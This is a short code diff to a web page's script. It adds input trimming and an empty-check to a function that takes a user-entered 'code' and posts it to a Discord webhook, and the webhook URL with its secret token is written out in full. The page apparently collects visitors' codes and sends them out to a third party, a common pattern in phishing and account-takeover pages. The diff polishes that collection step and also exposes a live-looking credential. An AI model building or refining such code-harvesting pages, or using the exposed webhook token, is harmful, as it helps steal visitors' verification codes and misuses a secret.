@@ -94,7 +94,13 @@
 
     <script>
         async function submitCode() {
-            const code = document.getElementById('code').value;
+            const code = document.getElementById('code').value.trim(); // Trim to remove any whitespace
+
+            // Check if code is empty
+            if (!code) {
+                alert('Please enter a valid code.');
+                return;
+            }
 
             // Send the code to the Discord webhook
             await fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
